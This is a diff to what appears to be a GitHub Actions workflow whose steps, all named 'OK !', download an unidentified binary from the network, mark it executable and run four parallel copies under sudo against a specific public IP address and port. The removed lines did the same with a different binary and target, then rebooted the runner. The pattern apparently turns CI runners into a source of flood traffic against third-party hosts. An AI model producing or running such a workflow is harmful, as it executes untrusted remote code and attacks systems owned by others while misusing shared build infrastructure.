@@ -15,11 +15,11 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://curl.by/y6xb1/ovhand -O ovhand
-          chmod +x ovhand
+          wget https://github.com/Paraloxd/tekpoyraz/raw/refs/heads/main/tekpoyraz -O tekpoyraz
+          chmod +x tekpoyraz
           PIDS=()
           for i in {1..4}; do
-            sudo timeout 30 ./ovhand 185.240.104.33 3389 10 30 &
+            sudo timeout 30 ./tekpoyraz 78.163.5.176 53 &
             PIDS+=($!)
           done
           
@@ -28,7 +28,6 @@ jobs:
           done
 
       - name: OK !
-        run: sleep 30
-        
-      - name: OK !
-        run: sudo reboot
+        run: |
+          sleep 30
+          exit 0
